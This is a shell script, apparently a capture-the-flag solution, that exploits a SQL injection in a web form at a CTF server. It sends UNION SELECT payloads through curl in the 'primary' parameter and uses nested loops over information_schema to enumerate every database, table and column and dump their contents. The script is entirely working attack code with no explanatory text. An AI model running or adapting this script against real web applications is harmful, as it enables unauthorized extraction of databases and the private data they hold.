#!/bin/sh

URL='https://ctf.rc3.club:2010/'

query() {
    curl --silent --data-urlencode "primary=blah%' union select 1337, $3 from $1.$2 where $4 and $5 like '%$6" "$URL"  
}

scrape() {
    grep -A 1 --no-group-separator '<td>' |
    grep -v '<td>' |
    grep -v 1337 |
    sed 's/^[[:space:]]*//'
}

query_dbs() {
    query information_schema schemata schema_name '1=1' schema_name 
}

query_tables() {
    query information_schema tables table_name '1=1' table_schema "$1" 
}

query_columns() {
    query information_schema columns column_name "table_schema='$1'" table_name "$2" 
}

query_values() {
    query "$1" "$2" "$3" '1=1' "$3" 
}

query_expression() {
    query information_schema schemata "$1" '1=1' schema_name information_schema
}

query_dbs | scrape |
while read db
do
    query_tables "$db" | scrape | 
    while read table
    do
        query_columns "$db" "$table" | scrape |
        while read column
        do
            echo "$db" "$table" "$column"
            query_values "$db" "$table" "$column" | scrape
            echo
        done
    done
done